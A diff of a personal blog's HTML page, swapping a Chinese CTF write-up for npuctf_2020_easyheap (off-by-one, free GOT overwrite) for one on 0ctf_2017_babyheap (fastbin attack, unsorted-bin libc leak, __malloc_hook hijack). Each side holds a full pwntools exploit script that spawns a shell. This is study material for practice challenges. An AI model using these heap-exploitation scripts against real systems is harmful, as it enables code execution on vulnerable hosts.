@@ -18,33 +18,25 @@
   <meta name="author" content="0P1N">
   <meta name="keywords" content="">
   
-    <meta name="description" content="npuctf_2020_easyheap考点：off_by_one got表可写，没开pie，ubuntu版本1804，glibc2.27  经典菜单题  create函数， 1.存在bss段的内存来存放chunk的管理结构的指针，chunk的管理结构通过malloc(0x10)申请，分别存放用户申请的chunk的size和指针 2.限制了用户只能申请0x18和0x38的size，即用户申请的ch">
+    <meta name="description" content="0ctf_2017_babyheap非常经典的堆题，涉及了不少知识点和坑，做个记录 题目概述： 有alloc、fill、free、dump,fill里存在堆溢出 堆的信息记录在mmap随机分配的heap_array中， 每个heap_array单元有24个字节 低地址8位记录堆是否被释放，没有被释放1，已经被释放0 中间8位记录申请的大小(用户输入值，不是chunk_size) 高地址8位记录申请">
 <meta property="og:type" content="article">
-<meta property="og:title" content="npuctf_2020_easyheap">
-<meta property="og:url" content="https://lkliki.github.io/2023/05/18/npuctf-2020-easyheap/index.html">
+<meta property="og:title" content="0ctf_2017_babyheap">
+<meta property="og:url" content="https://lkliki.github.io/2023/05/18/0ctf-2017-babyheap/index.html">
 <meta property="og:site_name" content="0P1N">
-<meta property="og:description" content="npuctf_2020_easyheap考点：off_by_one got表可写，没开pie，ubuntu版本1804，glibc2.27  经典菜单题  create函数， 1.存在bss段的内存来存放chunk的管理结构的指针，chunk的管理结构通过malloc(0x10)申请，分别存放用户申请的chunk的size和指针 2.限制了用户只能申请0x18和0x38的size，即用户申请的ch">
+<meta property="og:description" content="0ctf_2017_babyheap非常经典的堆题，涉及了不少知识点和坑，做个记录 题目概述： 有alloc、fill、free、dump,fill里存在堆溢出 堆的信息记录在mmap随机分配的heap_array中， 每个heap_array单元有24个字节 低地址8位记录堆是否被释放，没有被释放1，已经被释放0 中间8位记录申请的大小(用户输入值，不是chunk_size) 高地址8位记录申请">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://lkliki.github.io/2023/05/18/npuctf-2020-easyheap/QQ%E6%88%AA%E5%9B%BE20230518153935.png">
-<meta property="og:image" content="https://lkliki.github.io/2023/05/18/npuctf-2020-easyheap/QQ%E6%88%AA%E5%9B%BE20230518154423.png">
-<meta property="og:image" content="https://lkliki.github.io/2023/05/18/npuctf-2020-easyheap/QQ%E6%88%AA%E5%9B%BE20230518164014.png">
-<meta property="og:image" content="https://lkliki.github.io/2023/05/18/npuctf-2020-easyheap/QQ%E6%88%AA%E5%9B%BE20230518165404.png">
-<meta property="og:image" content="https://lkliki.github.io/2023/05/18/npuctf-2020-easyheap/QQ%E6%88%AA%E5%9B%BE20230518165551.png">
-<meta property="article:published_time" content="2023-05-18T12:54:17.000Z">
-<meta property="article:modified_time" content="2023-05-18T13:58:17.773Z">
+<meta property="article:published_time" content="2023-05-18T14:17:14.000Z">
+<meta property="article:modified_time" content="2023-05-18T14:22:52.609Z">
 <meta property="article:author" content="0P1N">
+<meta property="article:tag" content="unsorted_bin_leak">
 <meta property="article:tag" content="fastbin_attack">
-<meta property="article:tag" content="heap">
-<meta property="article:tag" content="glibc2.27">
-<meta property="article:tag" content="off_by_one">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://lkliki.github.io/2023/05/18/npuctf-2020-easyheap/QQ%E6%88%AA%E5%9B%BE20230518153935.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>npuctf_2020_easyheap - 0P1N</title>
+  <title>0ctf_2017_babyheap - 0P1N</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -236,7 +228,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="npuctf_2020_easyheap"></span>
+            <span id="subtitle" data-typed-text="0ctf_2017_babyheap"></span>
           
         </div>
 
@@ -247,7 +239,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-05-18 20:54" pubdate>
+        <time datetime="2023-05-18 22:17" pubdate>
           2023年5月18日 晚上
         </time>
       </span>
@@ -259,7 +251,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.3k 字
+          3k 字
         
       </span>
     
@@ -270,7 +262,7 @@
         
         
         
-          20 分钟
+          25 分钟
         
       </span>
     
@@ -316,32 +308,30 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">npuctf_2020_easyheap</h1>
+            <h1 style="display: none">0ctf_2017_babyheap</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="npuctf-2020-easyheap"><a href="#npuctf-2020-easyheap" class="headerlink" title="npuctf_2020_easyheap"></a>npuctf_2020_easyheap</h1><p>考点：off_by_one</p>
-<p>got表可写，没开pie，ubuntu版本1804，glibc2.27</p>
-<p><img src="/2023/05/18/npuctf-2020-easyheap/QQ%E6%88%AA%E5%9B%BE20230518153935.png" srcset="/img/loading.gif" lazyload alt="QQ截图20230518153935"></p>
-<p>经典菜单题</p>
-<p><img src="/2023/05/18/npuctf-2020-easyheap/QQ%E6%88%AA%E5%9B%BE20230518154423.png" srcset="/img/loading.gif" lazyload alt="QQ截图20230518154423"></p>
-<p>create函数，</p>
-<p>1.存在bss段的内存来存放chunk的管理结构的指针，chunk的管理结构通过malloc(0x10)申请，分别存放用户申请的chunk的size和指针</p>
-<p>2.限制了用户只能申请0x18和0x38的size，即用户申请的chunk算上chunk_header只能是0x20或0x40</p>
-<p>3.最多申请10个chunk</p>
-<p><img src="/2023/05/18/npuctf-2020-easyheap/QQ%E6%88%AA%E5%9B%BE20230518164014.png" srcset="/img/loading.gif" lazyload alt="QQ截图20230518164014"></p>
-<p>edit()</p>
-<p>存在off_by_one漏洞</p>
-<p><img src="/2023/05/18/npuctf-2020-easyheap/QQ%E6%88%AA%E5%9B%BE20230518165404.png" srcset="/img/loading.gif" lazyload alt="QQ截图20230518165404"></p>
-<p>show()</p>
-<p><img src="/2023/05/18/npuctf-2020-easyheap/QQ%E6%88%AA%E5%9B%BE20230518165551.png" srcset="/img/loading.gif" lazyload alt="QQ截图20230518165551"></p>
-<p>delete()删除堆，不存在uaf，没问题</p>
-<p>思路：got表可写，首先考虑修改free_got(其实atoi函数也可以)来getshell，只要能把管理员chunk中存放的指针修改成free_got，便能通过edit和show函数进行修改和泄露</p>
-<p>由于edit能修改的个数取决于管理员chunk中存放的size，所以通过off_by_one修改下一个chunk的size位来溢出是不可行的。</p>
-<p>经过尝试，发现可以利用fastbin，修改0x20的chunk为0x40，把被修改的chunk删了放到fastbin，再申请0x38的chunk，这时候0x20的管理员chunk被申请到了高地址的0x20，0x40的chunk被申请到了低地址的0x20，也就是说0x20的管理员chunk被包含在了0x40的用户chunk中</p>
-<p>脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br><br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,binary=<span class="hljs-string">&#x27;./npuctf_2020_easyheap&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;./npuctf_2020_easyheap&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./npuctf_2020_easyheap&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>	sleep(<span class="hljs-number">1</span>)<br>	gdb.attach(io,<span class="hljs-string">&#x27;b menu&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,content</span>):<br>	io.recvuntil(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>	io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>	io.recvuntil(<span class="hljs-string">&#x27;Size of Heap(0x10 or 0x20 only) : &#x27;</span>)<br>	io.sendline(<span class="hljs-built_in">str</span>(size))   <br>	io.recvuntil(<span class="hljs-string">&#x27;Content:&#x27;</span>)<br>	io.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>	io.recvuntil(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>	io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>	io.recvuntil(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>	io.sendline(<span class="hljs-built_in">str</span>(idx))<br>	io.recvuntil(<span class="hljs-string">&#x27;Content:&#x27;</span>)<br>	io.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>	io.recvuntil(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>	io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>	io.recvuntil(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>	io.sendline(<span class="hljs-built_in">str</span>(idx))<br>	<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>	io.recvuntil(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>	io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>	io.recvuntil(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>	io.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]	<br>create(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>create(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment">#1</span><br>create(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;cccc&#x27;</span>) <span class="hljs-comment">#2</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x41</span>))<br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">0x38</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment">#1  **chunk_overlap</span><br><span class="hljs-comment">#debug()</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(<span class="hljs-number">0x200</span>)+p64(free_got))<br>show(<span class="hljs-number">1</span>)<br><br>io.recvuntil(<span class="hljs-string">&#x27;Content : &#x27;</span>)<br>free_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] free_addr = &#x27;</span> + <span class="hljs-built_in">hex</span>(free_addr))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;free&#x27;</span>,free_addr)<br>libc_base = free_addr - libc.dump(<span class="hljs-string">&#x27;free&#x27;</span>)<br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>edit(<span class="hljs-number">1</span>,p64(system_addr))<br>create(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment">#3</span><br>delete(<span class="hljs-number">3</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+                <h1 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a>0ctf_2017_babyheap</h1><p>非常经典的堆题，涉及了不少知识点和坑，做个记录</p>
+<p><strong>题目概述</strong>：</p>
+<p>有alloc、fill、free、dump,fill里存在堆溢出</p>
+<p>堆的信息记录在mmap随机分配的heap_array中，</p>
+<p>每个heap_array单元有24个字节</p>
+<p>低地址8位记录堆是否被释放，没有被释放1，已经被释放0</p>
+<p>中间8位记录申请的大小(用户输入值，不是chunk_size)</p>
+<p>高地址8位记录申请的chunk地址(指向usr_data)</p>
+<p>保护全开</p>
+<p>1.pie + 堆溢出 + fastbin_attack</p>
+<p>在开了pie的情况下，由于堆内存是连续的并且第一个chunk的地址的低3位一定为0，对相距较近的chunk（只有最后一个字节不同），可以利用堆溢出只修改fastbin中chunk的fd指针的最后一个字节来把其它chunk放到fastbin中，再malloc申请出来可以达到多个指针指向同一个chunk的效果。</p>
+<p>2.unsorted bin leak</p>
+<p>small bin大小的chunk被free后进入unsorted bin，unsorted bin中只有一个chunk时，其fd和bk都指向main_arena + 88,有多个时，链表两端的chunk的fd和bk之一指向main_arena + 88。把一个small bin大小的chunk释放进入unsorted bin后再打印其中的内容就能泄露libc，<strong>泄露main_arena + 88后leak_addr - 88 - 0x10就是__malloc_hook的地址，然后就能使用LibcSearcher</strong>了。这要求<strong>有uaf或两个指针都指向该chunk</strong>。</p>
+<p><strong>注意：将small bin释放到unsorted bin中时一定要确保其上方还有chunk，否则会被top_chunk合并而不进入任何bins中</strong></p>
+<p>3.堆溢出 + fastbin attack劫持malloc_hook为one_gadget</p>
+<p>因为知道了libc版本，也能获取.so文件，不用构造system(‘&#x2F;bin&#x2F;sh\x00’)而是直接使用one_gadget</p>
+<p> 注意：本地和靶机的libc版本不同(哪怕是细微的不同)，one_gadget的地址也会不同，需要重新查看one_gadget的地址</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,binary=<span class="hljs-string">&#x27;./0ctf_2017_babyheap&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./0ctf_2017_babyheap&#x27;</span>)<br>io = process(<span class="hljs-string">&#x27;./0ctf_2017_babyheap&#x27;</span>)<br><span class="hljs-comment">#io = remote(&#x27;mode4.buuoj.cn&#x27;,26272)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>	io.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>	io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>	io.recvuntil(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>	io.sendline(<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">idx,size,content</span>):<br>	io.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>	io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>	io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>	io.sendline(<span class="hljs-built_in">str</span>(idx))<br>	io.recvuntil(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>	io.sendline(<span class="hljs-built_in">str</span>(size))<br>	io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>	io.send(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dlt</span>(<span class="hljs-params">idx</span>):<br>	io.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>	io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>	io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>	io.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">idx</span>):<br>	io.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>	io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)	<br>	io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>	io.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>	gdb.attach(io)<br>	pause()<br><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#0</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#1</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#2 </span><br><span class="hljs-comment">#开了pie，需要先让1的fd指向2，再通过修改最后一字节来使其指向4，否则只申请0、1即可</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#3</span><br>alloc(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#4</span><br><br>dlt(<span class="hljs-number">1</span>)<br>dlt(<span class="hljs-number">2</span>)<br><br><br>payload1 = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">b&#x27;\x80&#x27;</span><br>fill(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload1),payload1)<br>payload2= p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">3</span>,<span class="hljs-built_in">len</span>(payload2),payload2)<br>alloc(<span class="hljs-number">0x10</span>)  <span class="hljs-comment">#1</span><br>alloc(<span class="hljs-number">0x10</span>)  <span class="hljs-comment">#2(4)</span><br><br>payload3= p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">3</span>,<span class="hljs-built_in">len</span>(payload3),payload3)<br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#5   #prevent from being involved by top_chunk</span><br>dlt(<span class="hljs-number">2</span>)<br><br>dump(<span class="hljs-number">4</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: \x0a&#x27;</span>)<br>leak = u64((io.recv(<span class="hljs-number">6</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>main_arena_addr = leak - <span class="hljs-number">88</span><br>__malloc_hook = main_arena_addr - <span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(__malloc_hook))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>,__malloc_hook)<br>libc_base = __malloc_hook - libc.dump(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>)<br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#2(4)   #split the 0x91 chunk</span><br>dlt(<span class="hljs-number">2</span>)<br>payload4=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x71</span>)+p64(__malloc_hook - <span class="hljs-number">0x23</span>)<br>fill(<span class="hljs-number">3</span>,<span class="hljs-built_in">len</span>(payload4),payload4)<br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#2</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#6 -- __malloc_hook</span><br><br>one_gadget = libc_base + <span class="hljs-number">0x4526a</span><br>payload5 = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x13</span> + p64(one_gadget) <br>fill(<span class="hljs-number">6</span>,<span class="hljs-built_in">len</span>(payload5),payload5)<br><br>alloc(<span class="hljs-number">0x10</span>)<br><span class="hljs-comment">#debug()</span><br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>
 
 
                 
@@ -383,13 +373,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
+        <a href="../../../../tags/unsorted-bin-leak/">#unsorted_bin_leak</a>
+      
         <a href="../../../../tags/fastbin-attack/">#fastbin_attack</a>
-      
-        <a href="../../../../tags/heap/">#heap</a>
-      
-        <a href="../../../../tags/glibc2-27/">#glibc2.27</a>
-      
-        <a href="../../../../tags/off-by-one/">#off_by_one</a>
       
     </div>
   
@@ -401,8 +387,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>npuctf_2020_easyheap</div>
-      <div>https://lkliki.github.io/2023/05/18/npuctf-2020-easyheap/</div>
+      <div>0ctf_2017_babyheap</div>
+      <div>https://lkliki.github.io/2023/05/18/0ctf-2017-babyheap/</div>
     </div>
     <div class="license-meta">
       
@@ -444,18 +430,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="../%E5%8D%9A%E5%AE%A2%E7%BB%B4%E6%8A%A4/" title="博客维护">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">博客维护</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="../../../../2022/09/22/canary%E4%BF%9D%E6%8A%A4%E5%8F%8A%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/" title="canary保护及绕过学习">
-                        <span class="hidden-mobile">canary保护及绕过学习</span>
+                      <a href="../roarctf-2019-easy-pwn/" title="roarctf_2019_easy_pwn">
+                        <span class="hidden-mobile">roarctf_2019_easy_pwn</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
